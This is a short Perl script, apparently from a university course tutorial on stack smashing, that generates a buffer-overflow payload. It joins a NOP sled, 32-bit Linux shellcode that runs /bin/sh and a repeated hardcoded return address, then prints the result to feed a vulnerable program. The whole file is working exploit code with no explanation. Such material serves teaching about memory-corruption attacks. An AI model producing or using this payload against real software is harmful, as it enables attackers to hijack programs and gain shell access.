#!/usr/bin/perl
#Code from Tutorial -> http://www.cs.toronto.edu/~arnold/347/17f/lectures/smashStack/notes/shellcode.txt

my $noops= "\x90" x 16;

my $shellCodeBase=
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
  "\x80\xe8\xdc\xff\xff\xff/bin/sh" .
  "\x90\x90\x90"; # extended to 3*16 bytes

my $returnAddress= "\xf0\xf6\xff\xbf";
my $shellCode= ($noops x 61) . "\x90\x90\x90\x90" . ($shellCodeBase) . ($returnAddress x 6) . 
"\n";

print "$shellCode";